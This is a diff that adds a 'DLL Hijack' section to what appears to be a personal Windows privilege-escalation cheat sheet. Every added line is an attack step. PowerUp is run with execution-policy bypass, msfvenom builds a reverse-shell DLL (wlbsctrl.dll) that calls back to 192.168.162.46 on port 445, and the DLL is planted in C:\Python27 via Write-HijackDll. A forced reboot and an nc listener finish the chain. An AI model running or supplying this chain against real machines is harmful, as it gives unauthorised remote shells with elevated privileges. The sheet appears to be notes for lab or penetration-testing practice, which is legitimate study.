@@ -343,6 +343,17 @@ net stop usosvc
 net start usosvc
 nc -nvlp 443
 
+==================================
+DLL Hijack
+
+powershell -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.162.46 LPORT=445 -f dll -o wlbsctrl.dll
+copy c:\xampp\htdocs\wlbsctrl.dll c:\Python27\
+powershell -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Write-HijackDll -DllPath 'C:\\Python27\\wlbsctrl.dll'}"
+shutdown -r -t 10 && exit
+nc -nvlp 445
+
+
 ================================== 
 DLL Hijack
 Example: Vista/Win8
